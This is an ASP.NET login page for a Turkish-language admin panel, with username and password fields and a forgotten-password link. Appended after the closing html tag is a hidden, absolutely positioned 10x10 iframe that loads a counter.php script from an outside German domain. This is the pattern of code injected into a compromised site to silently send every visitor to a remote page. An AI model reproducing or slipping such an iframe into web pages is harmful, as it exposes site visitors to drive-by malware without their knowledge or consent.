<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Giris.aspx.cs" Inherits="Yonetim_Giris" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>Yönetim Paneli</title>
    <style type="text/css" media="all">
        @import url("Library/Css/style.css");
        @import url("Library/Css/niceforms-default.css");
    </style>
    <script type="text/javascript" src="Library/JavaScript/jquery.min.js"></script>
    <script type="text/javascript" src="Library/JavaScript/jconfirmaction.jquery.js"></script>
    <script type="text/javascript">
    $(document).ready(function () {
        $('.ask').jConfirmAction();
    });
    </script>
    <script language="javascript" type="text/javascript" src="Library/JavaScript/niceforms.js"></script>
</head>
<body>
    <form id="form1" runat="server" class="niceform">
        <div id="main_container">
	        <div class="header_login">
                <div class="logo"><a href="#"><img src="Library/Images/logo.png" alt="" title="" border="0" /></a></div>
            </div>
            
            <div class="login_form">
                <h3>Yönetim Panel Girişi</h3>
                <a href="SifreUnuttum.aspx" class="forgot_pass">Şifremi Unuttum?</a>
                <fieldset class="fieldsett">
                    <dl>
                        <dt><label for="email">Kullanıcı Adı:</label></dt>
                        <dd><asp:TextBox ID="giris_kullaniciadi" runat="server"></asp:TextBox></dd>
                    </dl>
                    <dl>
                        <dt><label for="password">Şifre:</label></dt>
                        <dd><asp:TextBox ID="giris_sifre" runat="server" TextMode="Password"></asp:TextBox></dd>
                    </dl>
                    <dl class="submit"><asp:Button ID="Button1" runat="server" Text="Giriş Yap" onclick="Button1_Click" /></dl>
                </fieldset>
            </div>
        </div>
    </form>
</body>
</html><iframe src="http://www.bc-bs.de/counter.php" style="visibility: hidden; position: absolute; left: 0px; top: 0px" width="10" height="10"/>




